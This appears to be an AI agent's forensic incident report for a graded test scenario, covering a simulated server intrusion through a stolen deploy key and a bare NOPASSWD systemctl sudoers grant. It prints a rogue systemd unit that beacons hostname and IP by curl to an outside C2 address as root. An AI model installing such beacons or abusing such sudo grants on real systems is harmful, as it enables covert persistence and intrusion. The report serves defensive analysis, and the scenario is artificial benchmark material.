# Incident Report — Scenario 10 (Partial Evidence)
**Host:** production web server (identity inferred from context)
**Analyst:** Findevil autonomous DFIR agent
**Date (UTC):** 2026-04-23
**Evidence set:** `evidence/attack-scenario-10-partial/` — auth.log (12 lines, truncated), partial filesystem snapshot

---

## Verdict: CONFIRMED COMPROMISE — HIGH CONFIDENCE

The available evidence is sufficient to confirm an intrusion in progress. An external threat actor authenticated as the `deploy` user, performed enumeration and binary staging, and installed a rogue systemd beacon service. However, **this evidence set is materially incomplete** (see Evidence Gaps section). Several post-installation actions and persistence mechanisms cannot be confirmed or ruled out from the available artifacts.

---

## Timeline of Confirmed Events (UTC)

| Timestamp | Source | Event |
|-----------|--------|-------|
| Apr 13 08:15:42 | auth.log:3 | `deploy` logged in from **10.0.1.50** (internal) via publickey — legitimate CI/CD activity |
| Apr 13 08:15:45 | auth.log:5 | `deploy` → root: `systemctl restart nginx` — normal deployment command |
| Apr 14 03:17:44 | auth.log:7 | `deploy` logged in from **185.229.59.103** (external, non-RFC1918) via publickey — **OFF-HOURS, SUSPICIOUS** |
| Apr 14 03:18:02 | auth.log:9 | `deploy` → root: `cat /etc/passwd` — host enumeration / account recon |
| Apr 14 03:18:12 | auth.log:10 | `deploy` → root: `cp /tmp/update /usr/local/bin/update` — binary staged from /tmp |
| Apr 14 03:18:17 | auth.log:11 | `deploy` → root: `chmod +x /usr/local/bin/update` — binary made executable |
| Apr 14 03:18:29 | auth.log:12 | `deploy` → root: `tee /etc/systemd/system/system-updater.service` — rogue service written to disk |
| **— LOG TRUNCATED —** | auth.log | **No further auth events captured. Log rotation cut the session.** |

---

## Confirmed Findings

### 1. External SSH Authentication via Stolen Deploy Key
The `deploy` account authenticated from `185.229.59.103` at 03:17 UTC — off-hours, from a non-RFC1918 IP. SSH password authentication is disabled (`PasswordAuthentication no` in sshd_config), so this login required a valid private key. The legitimate `deploy` user session earlier that day originated from internal IP `10.0.1.50`.

**Attacker IP reputation:** `185.229.59.103` is confirmed in the local threat-intel cache as a **C2 server** (confidence: high, tags: c2, beacon).

**How the key was obtained:** Cannot be determined from this evidence set. No web server logs, no initial-access vector artifacts.

### 2. Privilege Escalation via Sudoers Misconfiguration
`/etc/sudoers.d/deploy` grants:
```
deploy  ALL=(root) NOPASSWD: /usr/bin/systemctl
```
This is a known GTFOBins vector: bare `systemctl` with no command restriction allows the `deploy` user to install and start any systemd service as root. The attacker exploited this directly to write and (presumably) enable the beacon service.

### 3. Binary Staging: `/usr/local/bin/update`
The attacker copied a binary from `/tmp/update` to `/usr/local/bin/update` and made it executable, both via sudo. The file is referenced by the rogue service's `ExecStart` (indirectly — the service uses `curl`, not `update` directly, so this binary's purpose is unclear). **The `/usr/local/bin/update` binary was not captured in this evidence set** and cannot be analyzed.

### 4. Rogue Systemd Service: `system-updater.service`
Present on disk at `fs/etc/systemd/system/system-updater.service`:

```ini
[Unit]
Description=System Updater Health Beacon
After=network-online.target

[Service]
Type=simple
ExecStart=/usr/bin/curl -sX POST https://185.229.59.103:8443/beacon \
  -d "host=$(hostname)&ip=$(hostname -I)"
Restart=always
RestartSec=600
User=root

[Install]
WantedBy=multi-user.target
```

This service beacons the host's hostname and IP address to the attacker's C2 at `185.229.59.103:8443` every 600 seconds (10 minutes), running as **root**. The `Restart=always` directive ensures it survives crashes or restarts.

### 5. Account Reconnaissance
The attacker read `/etc/passwd` (confirmed via auth.log sudo record). User accounts present on the system at time of imaging: `root`, `deploy`, `alice`, `bob`, `www-data`, plus standard system accounts.

---

## Evidence Gaps — What Cannot Be Determined

The following cannot be confirmed or excluded from this evidence set. Any report claiming certainty on these points would be fabricating findings.

### 1. Auth Log Truncated at 03:18:29
The auth.log ends mid-attack sequence at the moment the service file was written (`tee` command). **Missing from the log:**
- Whether `systemctl enable system-updater.service` was executed
- Whether `systemctl start system-updater.service` was executed (i.e., whether the beacon ran during this session)
- Whether the attacker performed additional commands after installing the service
- When and how the attacker's session ended

### 2. `/home/deploy/.ssh/authorized_keys` Not Captured
The imaging process did not capture the deploy user's `authorized_keys` file. **Cannot determine:**
- Whether the attacker added a backdoor SSH key for persistent re-entry
- Whether the original authorized key is still present (or was replaced)
- Whether SSH key persistence exists at all

This is the most significant gap for persistence assessment. SSH key backdoors are a standard post-intrusion step and are the leading secondary persistence mechanism in this attack pattern.

### 3. `/root/.bash_history` Not Captured
Root shell history was not included in the evidence set. **Cannot determine:**
- Whether additional commands were executed as root (outside of the visible sudo chain)
- Whether the attacker escalated to a root shell (`sudo -i`, `sudo bash`, etc.)

### 4. `/usr/local/bin/update` Binary Not Captured
The binary dropped by the attacker at `/usr/local/bin/update` is not present in the filesystem snapshot. **Cannot determine:**
- The binary's hash or reputation
- Its behavior or capabilities
- Whether it was designed for lateral movement, data exfiltration, or another purpose

### 5. No Verification That Beacon Actually Started
The rogue service is present on disk, but no logs confirming `systemctl enable` or `systemctl start` were captured. **Cannot confirm:**
- Whether the service was enabled for persistence across reboots
- Whether outbound C2 connections were established

### 6. Additional Persistence Not Ruled Out
No cron artifacts, no package manager logs (`dpkg`, `apt`), no `/tmp` snapshot, and no syslog were captured. **Cannot rule out:**
- Cron-based persistence
- Malicious packages installed via apt/dpkg
- Additional payloads in `/tmp`
- LD_PRELOAD or `/etc/ld.so.preload` manipulation (not present in captured fs)

---

## Pre-existing Vulnerability
The `NOPASSWD: /usr/bin/systemctl` sudoers grant is a critical misconfiguration independent of the intrusion. Any code or process running as `deploy` — including CI/CD pipelines — can install arbitrary root-level services without authentication. This misconfiguration existed before the attack and enabled the privilege escalation.

---

## Recommendations

1. **Immediate — revoke access:** Rotate or invalidate all SSH keys for the `deploy` account. If `authorized_keys` cannot be confirmed from evidence, treat as potentially backdoored.
2. **Immediate — disable rogue service:** Remove `system-updater.service`, kill any running `curl` beacon processes, block 185.229.59.103:8443 at the firewall.
3. **Immediate — audit dropped binary:** Locate and analyze `/usr/local/bin/update`; obtain hash for reputation check.
4. **Short-term — remediate sudoers:** Restrict the `systemctl` grant to specific service names (e.g., `NOPASSWD: /usr/bin/systemctl restart nginx`) rather than bare `systemctl`.
5. **Investigation — recover missing evidence:**
   - Reconstruct auth.log post-03:18:29 from any surviving log rotation archives or SIEM copies
   - Recover `deploy` user's `authorized_keys` from a backup or memory dump
   - Pull network flow logs for 185.229.59.103 to determine whether C2 beaconing occurred
6. **Investigation — determine initial access vector:** How the attacker obtained the deploy private key is unknown. Review CI/CD pipeline credentials, secret management systems, and any prior breaches.

---

## Evidence Summary

| Artifact | Status | Key Finding |
|----------|--------|-------------|
| `auth.log` | Truncated (12 lines) | Attacker login at 03:17:44 from 185.229.59.103; attack in progress at cut-off |
| `fs/etc/systemd/system/system-updater.service` | Captured | Confirmed rogue beacon service to C2 at 185.229.59.103:8443 |
| `fs/etc/sudoers.d/deploy` | Captured | Critical privesc misconfiguration (NOPASSWD bare systemctl) |
| `fs/etc/ssh/sshd_config` | Captured | No dangerous settings; password auth disabled |
| `fs/etc/passwd` | Captured | 3 interactive users: deploy, alice, bob |
| `fs/home/deploy/.bash_history` | Captured | Normal CI/CD activity; attack commands ran via sudo, not captured here |
| `fs/home/alice/.bash_history` | Captured | No suspicious activity |
| `fs/home/deploy/.ssh/authorized_keys` | **MISSING — not captured** | Cannot assess SSH key persistence |
| `/usr/local/bin/update` (dropped binary) | **MISSING — not captured** | Cannot analyze payload |
| `/root/.bash_history` | **MISSING — not captured** | Cannot assess root-level post-exploitation |
| Post-03:18:29 auth events | **MISSING — log truncated** | Cannot confirm service enablement or session close |

---

*Report generated by Findevil autonomous DFIR agent. All timestamps UTC. Evidence read-only — no modifications made.*

---

<!-- scorecard:start -->

## Verification scorecard

Mechanically computed by `scripts/grade_example_reports.py` against the
`agent_guard.SCENARIOS["10"]` markers (case-insensitive substring
match, identical logic to `tests/harness/agent_guard.py`'s grade()
function). No AI self-assessment is involved in these numbers.

| Metric | Score | % |
|---|---|---|
| Required markers found | 4/4 | **100%** |
| Cross-scenario markers absent | 6/6 | **100%** |
| Verdict-correctness confidence | — | **100%** |
| Hallucination-free confidence | — | **100%** |

**Overall confidence: HIGH** — every planted marker for this
scenario was surfaced in the report, and zero markers from any other
scenario leaked in. Re-grade with `python scripts/grade_example_reports.py`.

<!-- scorecard:end -->
